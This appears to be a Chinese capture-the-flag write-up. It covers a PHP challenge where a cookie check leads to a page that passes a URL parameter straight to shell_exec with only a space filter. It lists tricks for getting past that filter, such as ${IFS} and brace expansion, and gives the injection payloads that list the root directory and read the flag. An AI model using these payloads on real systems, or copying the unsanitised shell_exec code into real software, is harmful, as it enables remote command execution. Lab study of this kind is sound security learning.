#RCE

```php
<?php
	error_reporting(0);
	header("Content-Type:text/html;charset=utf-8");
	highlight_file(__FILE__);
	if($_COOKIE['admin']==1)    {       
		include "../next.php";   }
	else       
		echo "小饼干最好吃啦！";
?>
```

添加 session: admin=1
返回提示 rasalghul.php
查看该文件

```php
<?php
	error_reporting(0);
	highlight_file(__FILE__);
	error_reporting(0);
	if (isset($_GET['url'])) {
		$ip=$_GET['url'];
			if(preg_match("/ /", $ip)){
			    die('nonono');
			}
	$a = shell_exec($ip);
	echo $a;
	}
?>
```

过滤了空格

```txt
在CTF比赛中，命令中空格被过滤的解决方法
{cat,flag.txt}
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
kg=$'\x20flag.txt'&&cat$kg
(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)

```

这里选择${IFS}替代空格

```
?url=ls${IFS}/
```

得到目录

```
?url=cat${IFS}/fl*
```

得到 flag
